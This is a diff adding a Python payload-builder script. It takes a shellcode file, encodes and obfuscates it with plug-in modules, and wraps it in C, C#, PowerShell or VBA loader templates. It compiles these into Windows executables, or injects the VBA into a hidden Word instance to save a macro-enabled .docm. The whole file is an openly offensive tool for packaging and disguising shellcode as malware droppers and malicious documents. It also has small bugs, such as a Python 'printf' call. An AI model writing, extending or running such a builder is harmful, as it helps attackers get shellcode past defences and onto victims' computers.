@@ -1,0 +1,131 @@
+import argparse
+import importlib
+import importlib.util
+import platform
+from utils.utils import *
+import sys
+import os
+import subprocess
+
+try:
+    import win32com.client
+except:
+    pass
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--transformers", type=str, required=False)
+    parser.add_argument("--shellcode", type=str, required=True)
+    parser.add_argument("--template", type=str, required=True)
+    parser.add_argument("--language", type=str, required=True)
+    parser.add_argument("--obfuscator", type=str, required=False)
+    parser.add_argument("--output", type=str, required=False, default="output")
+    args = parser.parse_args()
+
+    shellcode = open(args.shellcode, 'rb').read()
+    shellcodeSize = len(shellcode)
+
+    compilerOptions = []
+    codeblocks = ''
+    if args.language == 'cs':
+        transformers = 'byte[] shellcode = {shellcode};'
+    elif args.language == 'c':
+        transformers = 'unsigned char *shellcode = {shellcode};'
+    elif args.language == 'vba':
+        transformers = 'shellcode = {shellcode}'
+    elif args.language == 'ps1':
+        transformers = '[Byte[]]$shellcode = {shellcode}'
+    imports = []
+
+    # Transform shellcode
+    if args.transformers:
+        transformersList = args.transformers.split(',')
+        for transformersItem in transformersList:
+            transformersSpec = importlib.util.spec_from_file_location(transformersItem, f'{args.language}/transformers/{transformersItem}.py')
+            transformersModule = importlib.util.module_from_spec(transformersSpec)
+            sys.modules[transformersSpec.name] = transformersModule 
+            transformersSpec.loader.exec_module(transformersModule)
+            transformersObject = getattr(transformersModule, transformersItem)()
+            transformersFunction = getattr(transformersObject, 'encode')
+            transformedShellcode = transformersFunction(shellcode)
+            codeblocks += getattr(transformersObject, 'codeblock')()
+            transformers = getattr(transformersObject, 'transformer')(transformers)
+            compilerOptions += getattr(transformersObject, 'compilerOptions')()
+            imports += getattr(transformersObject, 'imports' )()
+            shellcode = transformedShellcode
+
+    # Obfuscate shellcode
+    if args.obfuscator:
+        obfuscatorSpec = importlib.util.spec_from_file_location(args.obfuscator, f'{args.language}/obfuscators/{args.obfuscator}.py')
+        obfuscatorModule = importlib.util.module_from_spec(obfuscatorSpec)
+        sys.modules[obfuscatorSpec.name] = obfuscatorModule 
+        obfuscatorSpec.loader.exec_module(obfuscatorModule)
+        obfuscatorObject = getattr(obfuscatorModule, args.obfuscator)()
+        obfuscatorFunction = getattr(obfuscatorObject, 'obfuscate')
+        obfuscatedShellcode = obfuscatorFunction(shellcode)
+        codeblocks += getattr(obfuscatorObject, 'codeblock')()
+        transformers = getattr(obfuscatorObject, 'transformer')(transformers)
+        imports += getattr(obfuscatorObject, 'imports')()
+        compilerOptions += getattr(obfuscatorObject, 'compilerOptions')()
+        shellcode = obfuscatedShellcode
+
+    # Load template options
+    templateSpec = importlib.util.spec_from_file_location(args.template, f'{args.language}/templates/{args.template}.py')
+    templateModule = importlib.util.module_from_spec(templateSpec)
+    sys.modules[templateSpec.name] = templateModule 
+    templateSpec.loader.exec_module(templateModule)
+    templateObject = getattr(templateModule, args.template)()
+    templateCode = getattr(templateObject, 'template')()
+    imports = getattr(templateObject, 'imports')() + imports
+
+    # Rename obfuscated shellcode
+    if args.language == 'ps1':
+        transformers = transformers.format(shellcode='$obfuscated')
+    else:
+        transformers = transformers.format(shellcode='obfuscated')
+
+    # Place shellcode in correct format
+    shellcode = globals()[f'{type(shellcode).__name__}_to_{args.language}'](shellcode, 'obfuscated')
+
+    # Remove duplicates while retaining order
+    imports = '\n'.join(list(dict.fromkeys(imports)))
+
+    # Write template to temporary file for compilation
+    with open(f'{args.output}.{args.language}', 'w') as f:
+        print(f'Writing source code to {args.output}.{args.language}')
+        formattedCode = templateCode.format(imports=imports, shellcode=shellcode, codeblocks=codeblocks, transformers=transformers, shellcodeSize=shellcodeSize)
+        f.write(formattedCode)
+
+    # Compile file
+    if args.language == 'c':
+        result = subprocess.run(['x86_64-w64-mingw32-gcc', f'{args.output}.{args.language}', '-o', args.output] + compilerOptions)
+        if result.returncode == 0:
+            print(f'Payload saved to {args.output}.exe')
+    elif args.language == 'cs':
+        if args.output.lower()[-4:] != '.exe':
+            output = args.output + '.exe'
+        if platform.system() == 'Windows':
+            result = subprocess.run(['C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe', f'{args.output}.{args.language}', f'-out:{output}'])
+        elif platform.system() == 'Linux':
+            result = subprocess.run(['mcs', f'{args.output}.{args.language}', f'-out:{output}'])
+        if result.returncode == 0:
+            print(f'Payload saved to {args.output}.exe')
+    elif args.language == 'vba':
+        if platform.system() == 'Windows':
+            word_app = win32com.client.gencache.EnsureDispatch("Word.Application")
+            word_app.Visible = False
+            word_app.DisplayAlerts = False
+            doc = word_app.Documents.Add()
+            vba_module = doc.VBProject.VBComponents.Add(1)
+            vba_module.CodeModule.AddFromString(formattedCode)
+            out_path = os.path.abspath(f'{args.output}.docm')
+            doc.SaveAs2(out_path, FileFormat=13)
+            doc.Close(SaveChanges=False)
+            word_app.Quit()
+            print(f'Word Doc saved to {args.output}.docm')
+        elif platform.system() == 'Linux':
+            printf('VBA to docm is currently only supported on Windows')
+
+if __name__ == "__main__":
+    main()
+
